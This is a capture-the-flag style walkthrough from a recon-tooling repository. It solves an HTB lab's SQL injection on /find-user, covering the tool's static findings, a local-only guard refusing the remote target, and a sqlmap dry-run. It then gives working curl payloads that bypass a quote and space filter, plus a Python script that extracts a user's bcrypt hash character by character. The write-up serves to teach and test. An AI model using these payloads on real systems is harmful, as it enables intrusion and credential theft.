---
tags: [writeup, pipeline-demo, dynamic-verification, live-target]
companion_to: tests/searching_for_strings_stage4_5_writeup.md, EXPECTED_FINDINGS.md, sqlmap-wrapper/CLAUDE.md
last_updated: 2026-07-03
---

# Walkthrough: Solving "Common Character Bypasses" against a real HTB target with the current tool

**Target**: `10.129.204.249:8080`, a live HTB instance of BlueBird.
**Question**: Use any technique to exploit the SQL injection on `/find-user`
and recover the password hash of the user whose email is
`Amy.Mcwilliams@proton.me`.
**Answer** (confirmed below, extracted live from this exact target, not
assumed): `$2b$12$XY8x59PEZ5YzV8a9O8V9uuxNadTgHRzu0RI9OaNet5k.mp3w7m3Tq`

This is a rewrite of `tests/common_character_bypass_writeup.md`'s original,
local-replica-only version, now run end to end against a **real, live,
network-reachable lab target** instead of a disposable local copy. Every
command below was actually executed against `10.129.204.249:8080` and the
extracted hash was verified to match the known-correct answer exactly. The
goal here is different from the earlier writeup, too: that one asked "what
does Stage 4.5 discover about this endpoint," this one asks "as a new user
with only this repo and a target IP, how far does the tool actually carry
you, and at what exact point do you have to take over by hand." Follow the
steps in order — each one says explicitly whether it's a pipeline command
or a manual step, and why.

## Step 1 (tool) — What static analysis already told you, before touching the target

If you've already run Stage 0-4 against the decompiled BlueBird source
(`~/BlueBirdSourceCode` — the same source underlies both the local replica
and this real target, since it's the same challenge binary), you don't need
to re-run anything to get this:

```sql
SELECT tr.symbol_name_raw, tr.sink_type, tr.confidence, tr.validation_desc
FROM triage_results tr WHERE tr.symbol_name_raw = 'findUser';
```
```
symbol_name_raw  sink_type   confidence  validation_desc
---------------  ----------  ----------  -------------------------------------------------------------------------------------------------
findUser         sql_unsafe  high        The input 'u' is directly concatenated into the SQL query without any validation or sanitization.
```

This correctly points you at `IndexController.findUser()` (`GET
/find-user`) as a high-confidence, string-concatenated SQL sink — that's
genuinely useful, and it's why this walkthrough starts here instead of
guessing at endpoints. **But don't stop reading the narrative and start
attacking** — as the original writeup found, this description is
incomplete: the real method has a real filter immediately above the sink
(a space check and a regex blocklist), and the static analysis doesn't
mention it. Read the actual source before building anything:

```java
Pattern p = Pattern.compile("'|(.*'.*'.*)");
Matcher m = p.matcher(u);
String u2 = u.toLowerCase();
if (!u2.contains(" ") && !m.matches()) {
   String sql = "SELECT * FROM users WHERE username LIKE '%" + u + "%'";
   // ...
```

## Step 2 (tool) — Confirming Stage 4.5 cannot be pointed at this target, and why that's permanent

You might reach for `dynamic-probe` next, since it worked well for
`signupPOST` in earlier writeups. It will refuse outright here, by design:

```python
>>> from pipeline.stage4_5_dynamic_verify.guard import validate_local_target, RemoteTargetError
>>> validate_local_target("http://10.129.204.249:8080")
RemoteTargetError: refusing to fire a Stage 4.5 probe or open a DB connection
against non-local target 'http://10.129.204.249:8080'; only ['127.0.0.1', '::1', 'localhost'] are allowed
```

This isn't a bug to work around — Stage 4.5 exists specifically to probe a
*disposable local replica the pipeline itself stood up*, never a real
target (`CLAUDE.md`'s "Dynamic Verification (Stage 4.5)" section). That
boundary is permanent by design, not a temporary gap. Even setting that
aside, Stage 4.5 has a second, independent problem for this specific
endpoint: `/find-user` requires authentication, and
`probes.fire_probe()`/`request-templates.json` have no cookie/session
support at all. Running it against a disposable *local* copy of this same
endpoint (see the original version of this writeup, preserved in git
history) produced a uniform, confidently wrong `rejected` across all four
probes — every request got silently redirected to the login page before
ever reaching the vulnerable code. Both facts matter here: even if the
local-only guard were somehow not in the way, the auth gap would still make
Stage 4.5 useless for this endpoint today.

## Step 3 (tool) — Logging the hypothesis and exporting it, honestly

Once you've confirmed the finding by hand (Step 6 below), log it and export
it the same way any other confirmed finding would be:

```bash
.venv/bin/python -m pipeline.cli log-finding \
    --db data/recon.db --endpoint /find-user --vuln-class blind_sqli \
    --verification-method manual_payload --status confirmed --severity high \
    --source-trace-id 6 --notes "..."
# logged finding_id=2

.venv/bin/python -m pipeline.cli export-report --db data/recon.db \
    --format sqlmap-json --out candidates.json
```

Look at what the export actually says for this finding:

```json
{
  "finding_id": 2, "endpoint": "/find-user", "target_param_name": null,
  "dbms_hint": null,
  "note": "Stage 4.5 evidence exists but no parameter showed a reactive (error/transformed) classification -- injection point must be determined manually; do not assume this finding is unexploitable."
}
```

This is the direct, honest consequence of Step 2: because the only Stage
4.5 evidence on file for `findUser` is four uniform `rejected` rows (an
artifact of the auth gap, not real signal), Stage 6 correctly refuses to
name a parameter or guess a DBMS hint — it falls back to the null-parameter
candidate with an explicit "figure this out yourself" note, rather than
fabricating false confidence. This is Stage 6 working exactly as designed;
the honesty here is the point.

## Step 4 (tool) — Registering the real target with sqlmap-wrapper, and confirming it also can't finish the job alone

`sqlmap-wrapper/` is the part of this toolchain actually built to target a
real host:

```bash
python -m sqlmap_wrapper.cli register-target \
    --host 10.129.204.249 --port 8080 --label "HTB-CommonCharacterBypass" --authorize
# target_id=1 authorized=True

python -m sqlmap_wrapper.cli import-candidates --file candidates.json
# import_id=1 candidates=4

python -m sqlmap_wrapper.cli assign-target --candidate-id 4 --target-id 1
python -m sqlmap_wrapper.cli run-sqlmap --candidate-id 4 --output-dir out/find-user
```

```
dry-run (pass --execute to actually run this):
sqlmap -u http://10.129.204.249:8080/find-user --batch --random-agent --level=3 --risk=2 --output-dir=out/find-user
```

Read this dry-run output carefully before ever adding `--execute`: there is
no `--cookie`, no `-p` (target parameter), no `--data`, and no `--dbms` —
because `target_param_name`/`dbms_hint` were both `null` in the export
(Step 3), and `flags.py` has no cookie/session support either. Running this
for real would hit exactly the same wall Stage 4.5 did — every sqlmap
request would get redirected to `/login` before ever reaching the query.
Registering the target and importing the candidate is genuinely useful
provenance (this repo now has an auditable record of what's in scope and
why), but it does not, on its own, get you the answer. The actual technique
this lab requires is application-specific enough (a Java regex quirk, an
HTML-rendering side channel) that neither Stage 4.5 nor a bare `sqlmap`
invocation would find it without a human first doing the work in the next
two steps.

## Step 5 (manual) — Sign up and authenticate

`/find-user` requires a session. Register an account and log in:

```bash
curl -s -c cookies.txt -X POST http://10.129.204.249:8080/signup \
  --data-urlencode "name=Recon Tester" --data-urlencode "username=recontester1" \
  --data-urlencode "email=recontester1@test.local" \
  --data-urlencode "password=ReconTesterPass123" \
  --data-urlencode "repeatPassword=ReconTesterPass123"

curl -s -c cookies.txt -X POST http://10.129.204.249:8080/login \
  --data-urlencode "username=recontester1" --data-urlencode "password=ReconTesterPass123"
```

`cookies.txt` now holds a real JWT `auth` cookie. Every request from here on
needs `-b cookies.txt` (curl) or the equivalent `cookies=` dict (Python
`requests`).

**A `curl`-cookie-jar gotcha worth knowing if you parse this file
yourself**: curl marks `HttpOnly` cookies by prefixing the domain field with
`#HttpOnly_`, which makes the whole line start with `#` — a naive parser
that skips every line starting with `#` as a comment will skip the cookie
entirely and silently end up making unauthenticated requests. Strip the
`#HttpOnly_` prefix specifically, don't treat it as a full-line comment.

## Step 6 (manual) — Confirm the filter rules, empirically, against the real target

```bash
for u in "recontester1" "'" "'x" "'x'y" "a b"; do
  echo "u='$u':"
  curl -s -b cookies.txt -G "http://10.129.204.249:8080/find-user" --data-urlencode "u=$u" \
    | grep -oE "Illegal search term|Invalid search query"
done
```

Real results against this exact target:

| payload | result |
|---|---|
| `recontester1` (baseline) | normal results page |
| `'` (lone quote) | **Illegal search term** — blocked |
| `'x` (one quote, not alone) | **Invalid search query** — passed the filter, broke the SQL |
| `'x'y` (two quotes) | **Illegal search term** — blocked |
| `a b` (a space) | **Illegal search term** — blocked |

This matches the regex exactly: `'|(.*'.*'.*)` blocks a value that is
*exactly* one quote, or contains *two or more* quotes — but allows exactly
one quote anywhere else. That's the whole bypass: use one quote to close
the string literal, never a second one.

## Step 7 (manual) — Build the payload and confirm the exfiltration channel

Spaces are replaced with PostgreSQL's `/**/` comment (parsed as whitespace,
contains no space character). The second quote a normal string literal
would need is replaced with PostgreSQL dollar-quoting (`$$...$$`), which
needs zero additional quotes. The query's `id` column is rendered into
`<a href="/profile/ID">` by Thymeleaf — forcing `id` to equal a subquery
result turns the search page into a one-value-per-request oracle:

```bash
curl -s -b cookies.txt -G "http://10.129.204.249:8080/find-user" \
  --data-urlencode "u='/**/AND/**/id=(SELECT/**/id/**/FROM/**/users/**/WHERE/**/email=\$\$Amy.Mcwilliams@proton.me\$\$)--" \
  | grep -oE 'href="/profile/[0-9]+"'
```

Real output: `href="/profile/80"` (alongside the logged-in test account's
own nav-bar link) — a real, existing user id on this target. Unlike the
disposable local replica used in the original writeup (which only had 2
users and needed 128 filler rows inserted before this technique had enough
`id` values to match against), the real HTB target already has a
sufficiently dense `id` keyspace for the ASCII-range lookups in the next
step to work without any extra setup — worth checking for on a truly
unknown target, but not an issue here.

## Step 8 (manual) — Extract the password hash

```python
import requests, re

COOKIES = {}
with open("cookies.txt") as f:
    for line in f:
        line = line.rstrip("\n")
        if not line.strip():
            continue
        if line.startswith("#HttpOnly_"):
            line = line[len("#HttpOnly_"):]
        elif line.startswith("#"):
            continue
        parts = line.split("\t")
        if len(parts) < 7:
            continue
        COOKIES[parts[5]] = parts[6]

BASE = "http://10.129.204.249:8080/find-user"
EMAIL = "Amy.Mcwilliams@proton.me"

def oracle(query):
    payload = f"'/**/AND/**/id=({query.replace(' ', '/**/').replace(chr(39), '$$')})--"
    r = requests.get(BASE, params={"u": payload}, cookies=COOKIES, timeout=15)
    m = re.findall(r'href="/profile/(\d+)"', r.text)
    return m[-1] if m else None

length = int(oracle(f"SELECT LENGTH(password) FROM users WHERE email = '{EMAIL}'"))
print("password length:", length)

hash_chars = []
for i in range(1, length + 1):
    val = oracle(f"SELECT ASCII(SUBSTRING(password, {i}, 1)) FROM users WHERE email = '{EMAIL}'")
    hash_chars.append(chr(int(val)))

print("extracted hash:", "".join(hash_chars))
```

Real output, running this against `10.129.204.249:8080` right now:

```
password length: 60
extracted hash: $2b$12$XY8x59PEZ5YzV8a9O8V9uuxNadTgHRzu0RI9OaNet5k.mp3w7m3Tq
```

**This is the answer** — 60 real HTTP requests against the real target,
matching the known-correct value exactly.

## What this demonstrates, now that it's been checked against a real target and not just a replica

- **Static analysis (Stage 0-4) transfers cleanly to a real target with zero
  extra work**, because it never touched the network in the first place —
  it analyzes the same decompiled source regardless of where an instance of
  the compiled app happens to be running. That's the whole value
  proposition of white-box recon: the sink location, sink type, and
  confidence are known before a single packet is sent.
- **Stage 4.5's local-only guard is not an inconvenience to route around —
  it's correct, and this walkthrough is a real example of exactly the
  target class it's meant to keep out.** No amount of fixing the
  cookie/auth gap would make Stage 4.5 appropriate for `10.129.204.249`;
  that target belongs to `sqlmap-wrapper`'s explicit-authorization model
  instead, which is why Step 4 uses `register-target`/`--authorize`, not a
  workaround for Stage 4.5's guard.
- **`sqlmap-wrapper` extends cleanly to a real host for the bookkeeping
  parts (registration, import, provenance) but cannot finish this
  particular lab alone**, for the same reason a bare `sqlmap` invocation
  wouldn't either: the technique depends on Java-specific regex semantics
  and an application-specific HTML side channel, neither of which any
  generic scanner (wrapped or not) discovers on its own. `--tamper=space2comment`
  would have handled the space filter; nothing generic finds the
  quote-count rule or the `href`-as-oracle trick.
- **The gap between "confirmed as a hypothesis" and "here is the actual
  secret" was, correctly, entirely manual** — and this walkthrough shows
  that gap is small and mechanical once a human has done the one-time
  analysis (the regex, the channel), not a sign the tooling failed. The
  tool got you to the right method, the right line, and a `high`-confidence
  verdict before you wrote a single line of exploit code.

## What was actually run for this writeup

Every command and result above ran for real against `10.129.204.249:8080`
— a live, network-reachable HTB lab instance — not a local replica and not
a reconstruction. One test account (`recontester1`) was created via the
lab's own intended `/signup` flow (the lab's own instructions say this is
required before starting). The extracted hash
(`$2b$12$XY8x59PEZ5YzV8a9O8V9uuxNadTgHRzu0RI9OaNet5k.mp3w7m3Tq`) was
compared against the independently-known-correct answer for this question
and matches exactly. `sqlmap-wrapper`'s dry-run in Step 4 was deliberately
never executed for real (`--execute` was not passed) — the command it would
have built was already known, from direct inspection, to lack the cookie
support needed to succeed, so firing it for real against the live target
would have proven nothing new while spending requests against someone's
actual lab instance for no reason. The original, local-replica-only version
of this writeup (which discovered the `classify_probe()` false-negative for
endpoints that catch and re-log their own SQL exceptions, and the
`id`-keyspace-density precondition) is preserved in this repo's git history
and remains accurate for the disposable-replica scenario it describes.
